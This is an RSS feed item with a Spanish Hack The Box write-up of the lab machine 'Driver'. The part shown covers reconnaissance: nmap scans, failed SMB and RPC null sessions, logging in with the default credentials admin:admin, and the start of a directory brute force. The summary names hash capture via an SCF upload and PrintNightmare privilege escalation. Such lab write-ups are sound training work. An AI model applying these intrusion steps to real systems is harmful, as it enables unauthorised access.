<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" 
  xmlns:content="http://purl.org/rss/1.0/modules/content/" 
  xmlns:dc="http://purl.org/dc/elements/1.1/" 
  xmlns:atom="http://www.w3.org/2005/Atom" 
  xmlns:sy="http://purl.org/rss/1.0/modules/syndication/" 
  xmlns:media="http://search.yahoo.com/mrss/">
  <channel>
    <title>powershell on sckull</title>
    <link>https://sckull.github.io/tags/powershell/</link>
    <description>Recent content in powershell on sckull</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>es</language>
    <copyright>¬©{year}, All Rights Reserved</copyright>
    <lastBuildDate>Sat, 30 Apr 2022 00:00:00 +0000</lastBuildDate>
    <sy:updatePeriod>daily</sy:updatePeriod>
    <sy:updateFrequency>daily</sy:updateFrequency>
    
        <atom:link href="https://sckull.github.io/tags/powershell/index.xml" rel="self" type="application/rss+xml" />
    
    
    

      
      <item>
        <title>Hack The Box - Driver</title>
        <link>https://sckull.github.io/posts/driver/</link>
        <pubDate>Fri, 25 Feb 2022 00:00:00 +0000</pubDate>
        
        <atom:modified>Fri, 25 Feb 2022 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/driver/</guid>
        <description>En driver encontramos un sitio web que nos permite subir archivos a un recurso compartido de SMB, utilizamos un archivo sfc lo que nos permiti√≥ obtener el hash de un primer usuario y acceso por WinRM.</description>
        <content:encoded>



  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/htb/driver/cover.png&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;p&gt;En driver encontramos un sitio web que nos permite subir archivos a un recurso compartido de SMB, utilizamos un archivo sfc lo que nos permiti√≥ obtener el hash de un primer usuario y acceso por WinRM. Finalmente escalamos privilegios explotando la vulnerabilidad del servicio spool con PrintNightmare.&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Nombre&lt;/th&gt;
&lt;th align=&#34;center&#34;&gt;&lt;a href=&#34;https://www.hackthebox.eu/home/machines/profile/387&#34;&gt;Driver&lt;/a&gt; &lt;img src=&#34;data:image/png;base64,AAABAAIAEBAAAAAAIADBAwAAJgAAABgYAAAAACAAfwYAAOcDAACJUE5HDQoaCgAAAA1JSERSAAAAEAAAABAIBgAAAB/z/2EAAAOISURBVHicTdPfa1tlHAfgz/c9b07OSXJi0qZrkrWuK92Gc84WtU46FttOO3ehMC046HDqhWMi3g2naC8GgsMrGRWEOecPdDjxTgpzqaE6pRsiK3ZtTWvXHzm1bZo2OUlPTs55X2+GePf8Aw8BYEiBIQMXAE4Ppg7GO/hJqVO35YgmpgBMspys4Lo1IS5fGEyPAkAqBZ7JQNA9uE9hIPjoV7n3ozuVV0rLIhTJbaIzXIVlMxR1H1YaAihoqlUxcenX47W3M8hYqRQ49fdDMarPBhoHrG9b2ljf6JCJH4ej3mdnj7AOfo22hSzAqcl8oSpuBXVlsj2G1Xnv2txF/wuOMVwmAHjry8MfNbbhjUM3TRcLtjJlPEL+hofx4dfj6H+CcLC1gv11FfhXTDlmC++3ru186S9v6PxA+nV681z3obouNnxgJq8+7bgMe+4ntGq4cnURZ7+JQVMNRNk63nuRo+8hgvhzXqZVLm7sqnfWbnjPcP8e9nK94+odpS2BnU30w2QU+ekIFtb9OGpMIscdTC+v4/uxBBS1Dj1Jm9r/XqRpJ6xXdvleZSxIPfE1CxHNTyLgw605FVfH4mi+voL+gornzQIaYk2YK7bi5ykfEFAR0TVKrJbBguhmgEyGbReKj5NUQ4jH41DIAi+tIaqqaHNsNIbD4IqLWEM9hGpA8XEK2zUAMsEhASICcyvYCh9AZ98xGC0TiBztQnxhFtNcw5PB+wCnit0P7oetpxGS45CkQUoQlwRzQ/M1wynL7HyRZimLmBGCSwyj9Y+jnC8g4tbAQgHMzC4ipG2g0xOyqHNixHIcZfy0XB88UVpZkVa+SFNmFo5bBpECEh42SiV4UoKEgNSj2NFcQMWtCbMlqHgWMtyecT9d7fT13zaCPra2JG/O6mSt/gOucAghsFnahISA5wlEtiXwnJaTfzTrWPP7bOe2uEgAcOaL3o93PMBPJa9Mutk7YWVc20eMCQgJlCsWpPQgBMNjclbu3Wd7ueO7+d077ifnT6Rfo8FBMPOXw0bDafldYjt64yMmWpZKnqESU7hCAhKi5slSTYq7ybCy3JOAuYSRxcvusZb2TPG/TJ11R8K9Q94HgYR4KVau6nU5C6FyFSDACviRT4awHtK2KiY+//0dfmY4O1xMpcAJAEulwDL3Op86190T3ctPIih7IGSSAADMFFuUtiZqly68O5L+f+d/AV5RmAQ/zZ8wAAAAAElFTkSuQmCCiVBORw0KGgoAAAANSUhEUgAAABgAAAAYCAYAAADgdz34AAAGRklEQVR4nH2Wf2yVZxXHP8/7vO9733vfe2/vLbe3tV0pLZQfzUDGj/HDmTEmLIZFBUEzR7I4pllI/MNEcQG3iMO5xT/8axKjM0yzmIwMw0TChpnMGFfAsY1I6UZHaSmltKX398/3fZ/HP2hNK4snOf88yTmfc5JzzvcRgMHdpgB2fevLy5tXBDsiTcHmUFR1Y+p5ADoQU/W8caV023hn7JI89sbvT12cjrsrl/ifRw3oHY89urTjgeqPkh3+9lgzDVpApQi6Ph1kgxkWCA3VSZ3LXjOPD7xrvvTm0VN90znFZwEUwJ5ntjzRttb/RdMimsoZGDwPDTdLbG8t4GqFRlASklFpM5IMU2q3cZKC3DUxceOC3PfbQ6ePzIbMADSgn/7Jlh/O3+i9GEpi9J2u89GJgOyoZs9jD7NvdT8UPkUIg8APwKtRqgRc9kL0ppPUeyyCPOr6e+b+w8/99aUZyEz1es8zW56Yv9F/UbgY6XNlHhoYJX9lkHRbM3u//RVevriIly91k4+1YbZ8DpluI9LUxNqEZvfkTZrPljEiGO3rg58/uX/rk9NF32lj1+OPLFm2w/tH9B6VSp0ts9OfIJZK8GnBIZ9ciSLGd37Zh7LjLEorvtAdsK7TY2Wrh1krI4oZqtkcx8wmxte5FEeY+vBY6ItvvnaqzwBE23r/x4lOnTIvezxam8RJNFALN9LV3cR9XTdpcC4gamMEhBgYN/nd3zT7Xyvwh7MKYlF0vBEn0cC22iR2X51kJ41dG/wDgDC+sXvrimRH8LVqRrP+VobGeAgVSYIboRoy8WxJvNXBDnms6RoiJm8QVLKkYmVGs2VK0oZIBBVJkIyHWD+eoZrRJDu8r25//JH7zKZ71c5wWkSdj+v0WDWCcAo75vCnyxHO3WgmEpYYlkGrmact5xNtaeatm9cYGtUUay7PH0+xoSPHzh6fei3OUmuC89frVJeF3NblwS4zktKbtYB7psq4jiSwHYQjuVW0uDbhYIctlo2NsK+/n8xACFsMcmXBEia1geW2cnU8TNe8EsIxwXZwHZP2TIVPsHHT6iEjFFfdfkXTGtTAssG0QIIpFTE3hGEJlo4PEw6HGf7Bc/RYBptsyYLuxSQak8SjISxzethNC0yb1qCGXwY7qroNQ+pGXQdXBwhDggBlJZnXuhTLlBRzBf7tJohPjrP0z28giwUqQLVWY+r2baShiae7CKzknZmUkogOoK4xpEias1caNEL7lGKb6XngYXJGL4ViGdNYxe0H72fF2AjX1iynoaWdtZ6PVgrXjbBg1YPk7XO4t16dGf//mql8kRGWTpWERAcBKE1ZJ/H8gI0b1iCmr4pnSK4DhWyeDb4/XZAANHXPo2g0EFUagoCKMNC2QAdkzVpRDMQW6NSoDLHKL6IDxfmPBhmrTYBwZ98ttNbkcnm0nltloCUj0Sm+ntCYQZ1R6WJFIF8yrpjlCeOMgV4/kghTzuRw6lWqxQoqK6nHzbsA1WoNpWYDNIE2KFGBSJVyJWA4EUEgKN4S75oT/fJo+l7/e1677fbfCrG6WkDYDqNIBt+/iGEYcwC5Qh6t1ZwOOju7kFGJrBX42AtRmG/jTejKRL951Hz9yFsffH/N5hPtG/U330s3sjgzSqnYx6VPIhSyWQwxt4N88W6Apw26ZY0iNf7Z1ILTKJjsNU68fmTd+wagb/TKQ/khMrUem5N2ivnXj7Oy+DbSkChhooWc42qWCyFZ5/2dJeOnOGnOo9oTIj+kc0O91iE4qGb0QD21f+t3F272fo0DjWemWHF9nKEgjS9tkCYYBhrwfA+tFCiFUAGmX2ehk+FSe5rbm+ZBHQbesfa+8rO3DwPGHMHZe2jLs+0b/J+aURAXKqy8OkaXLuHYAkwThLjjSiH8gEpdMygifNDVgloVJijCcK958PCB0wdn1mu2ZGpAP/Xsl55uXx28EO8gWZnURK5WaRkvkq5XCQcBABUpGbfD3GxyqSx0CKcE+WGyI/8yD/zm+dO/4jMkk9mQ7bu3fb5zY3V/ckGwLZwSrtLglTTCuzOe2hJYrsAQUJnUpeyQPDncG3rh6KsnP+T/iP5su/Nt2bP1/pYlame0WW0yI3qxIWkQApRPrl4SV8oT8sxEv330j6/85dx03F25/gM90sVMzQeCpwAAAABJRU5ErkJggg==&#34; alt=&#34;box_img_maker&#34; /&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;OS&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;Windows&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Puntos&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;20&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Dificultad&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;Facil&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;IP&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;10.10.11.106&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Maker&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;span&gt;&lt;p class=&#34;user_maker&#34;&gt; &lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/13531&#34;&gt;MrR3boot&lt;/a&gt;&lt;img src=&#34;https://www.hackthebox.eu/badge/image/13531&#34; class=&#34;img_user_maker&#34;/&gt;&lt;/p&gt;&lt;/span&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;a href=&#34;#single__title&#34; class=&#34;button&#34; style=&#34;width: 72px; height: 30px; pointer-events: none;&#34;  data-color=&#34;default&#34; target=&#34;_blank&#34; rel=&#34;noreferrer&#34;&gt;
  &lt;span class=&#34;button__text&#34;&gt;
    Matrix
  &lt;/span&gt;
&lt;/a&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;div class=&#34;box&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-chart&#34; data-lang=&#34;chart&#34;&gt;{
   &amp;quot;type&amp;quot;:&amp;quot;radar&amp;quot;,
   &amp;quot;data&amp;quot;:{
      &amp;quot;labels&amp;quot;:[&amp;quot;Enumeration&amp;quot;,&amp;quot;Real-Life&amp;quot;,&amp;quot;CVE&amp;quot;,&amp;quot;Custom Explotation&amp;quot;,&amp;quot;CTF-Like&amp;quot;],
      &amp;quot;datasets&amp;quot;:[
         {
            &amp;quot;label&amp;quot;:&amp;quot;User Rate&amp;quot;,  &amp;quot;data&amp;quot;:[4.9, 5.9, 6.2, 3.8, 4.1],
            &amp;quot;backgroundColor&amp;quot;:&amp;quot;rgba(75, 162, 189,0.5)&amp;quot;,
            &amp;quot;borderColor&amp;quot;:&amp;quot;#4ba2bd&amp;quot;
         },
         { 
            &amp;quot;label&amp;quot;:&amp;quot;Maker Rate&amp;quot;,
            &amp;quot;data&amp;quot;:[0, 0, 0, 0, 0],
            &amp;quot;backgroundColor&amp;quot;:&amp;quot;rgba(154, 204, 20,0.5)&amp;quot;,
            &amp;quot;borderColor&amp;quot;:&amp;quot;#9acc14&amp;quot;
         }
      ]
   },
    &amp;quot;options&amp;quot;: {&amp;quot;scale&amp;quot;: {&amp;quot;ticks&amp;quot;: {&amp;quot;backdropColor&amp;quot;:&amp;quot;rgba(0,0,0,0)&amp;quot;},
            &amp;quot;angleLines&amp;quot;:{&amp;quot;color&amp;quot;:&amp;quot;rgba(255, 255, 255,0.6)&amp;quot;},
            &amp;quot;gridLines&amp;quot;:{&amp;quot;color&amp;quot;:&amp;quot;rgba(255, 255, 255,0.6)&amp;quot;}
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;recon&#34;&gt;Recon&lt;/h1&gt;
&lt;h2 id=&#34;nmap&#34;&gt;Nmap&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;nmap&lt;/code&gt; muestra distintos puertos abiertos: HTTP (80), RPC (445), SMB (445), WinRM (5985).&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; driver.htb &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.11.106&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.11s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.

PORT     STATE SERVICE      VERSION
80/tcp   open  http         Microsoft IIS httpd 10.0
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; http-auth:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; HTTP/1.1 &lt;span class=&#34;m&#34;&gt;401&lt;/span&gt; Unauthorized&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;0D
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  Basic &lt;span class=&#34;nv&#34;&gt;realm&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;MFP Firmware Update Center. Please enter password &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; admin
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; http-methods:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  Potentially risky methods: TRACE
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Microsoft-IIS/10.0
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Site doesn&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;t have a title &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;text/html&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;charset&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;UTF-8&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
135/tcp  open  msrpc        Microsoft Windows RPC
445/tcp  open  microsoft-ds Microsoft Windows &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; - &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; microsoft-ds &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;workgroup: WORKGROUP&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SSDP/UPnP&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Microsoft-HTTPAPI/2.0
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Not Found
Service Info: Host: DRIVER&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; OS: Windows&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows

Host script results:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_clock-skew: mean: 7h19m09s, deviation: 0s, median: 7h19m08s
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; smb-security-mode:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   authentication_level: user
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   challenge_response: supported
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  message_signing: disabled &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;dangerous, but default&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; smb2-security-mode:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   2.02:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_    Message signing enabled but not required
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; smb2-time:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   date: 2021-10-05T07:24:55
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  start_date: 2021-10-05T06:27:26
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;smb&#34;&gt;SMB&lt;/h2&gt;
&lt;p&gt;Utilizando algunas herramientas intentamos enumerar los recursos compartidos en samba pero no encontramos alguno.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; œÄ ~/htb/driver ‚ùØ smbclient -L 10.10.11.106
Enter WORKGROUP&lt;span class=&#34;se&#34;&gt;\k&lt;/span&gt;ali&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;s password:
session setup failed: NT_STATUS_ACCESS_DENIED 
 œÄ ~/htb/driver ‚ùØ crackmapexec smb 10.10.11.106 --shares
SMB         10.10.11.106    &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    DRIVER           &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Windows &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; Enterprise &lt;span class=&#34;m&#34;&gt;10240&lt;/span&gt; x64 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;name:DRIVER&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;domain:DRIVER&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;signing:False&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SMBv1:True&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
SMB         10.10.11.106    &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    DRIVER           &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Error enumerating shares: Error occurs &lt;span class=&#34;k&#34;&gt;while&lt;/span&gt; reading from remote&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;104&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
 œÄ ~/htb/driver ‚ùØ
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;rpc&#34;&gt;RPC&lt;/h2&gt;
&lt;p&gt;De igual forma con una sesion nula por RCP no logramos ingresar.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; œÄ ~/htb/driver ‚ùØ rpcclient -U &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt; -N 10.10.11.106
Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED
 œÄ ~/htb/driver ‚ùØ
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;web-site&#34;&gt;Web Site&lt;/h2&gt;
&lt;p&gt;En el puerto 80 vemos que pregunta por credenciales para el usuario admin.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/driver/Screenshot_20211004_174413.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos el nombre de usuario como contrase√±a (admin:admin) con los cuales logramos ingresar. Observamos un mensaje sobre tests de firmwares y drivers, adem√°s se muestra un dominio en el footer de la pagina el cual agregamos al archivo &lt;code&gt;/etc/hosts&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/driver/Screenshot_20211004_174604.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Vemos en la pagina de &lt;code&gt;Firmware Updates&lt;/code&gt; un formulario para subir acrhivos de actualizaci√≥n de firmware, en el mensaje indica la selecci√≥n de un modelo de impresora y, al subir los archivos estos se guardar√≠an en algun recurso compartido de archivos (&amp;ldquo;refiriendose a SMB&amp;rdquo;), y que, algun equipo realizar√° una revision y testing.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/driver/Screenshot_20211004_175931.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;directory-brute-forcing&#34;&gt;Directory Brute Forcing&lt;/h2&gt;
&lt;p&gt;Utilizamos &lt;code&gt;feroxbuster&lt;/code&gt; para busqueda de directorios y archivos, con la extensi√≥n &lt;code&gt;php&lt;/code&gt; junto con el header de autenticacion del sitio. Vemos que solo se muestran un par de direcci√≥nes y ninguna relacionada a una carpeta de archivos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; œÄ ~/htb/driver ‚ùØ feroxbuster -u http://driver.htb/ -w &lt;span class=&#34;nv&#34;&gt;$MD&lt;/span&gt; -x php -H &lt;span class=&#34;s2&#34;&gt;&amp;#34;Authorization: Basic YWRtaW46YWRtaW4=&amp;#34;&lt;/span&gt;

 ___  ___  __   __     __      __         __   ___
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;__  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;__  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;__&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;__&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; /  &lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;    /  &lt;span class=&#34;se&#34;&gt;\ \_&lt;/span&gt;/ &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;__
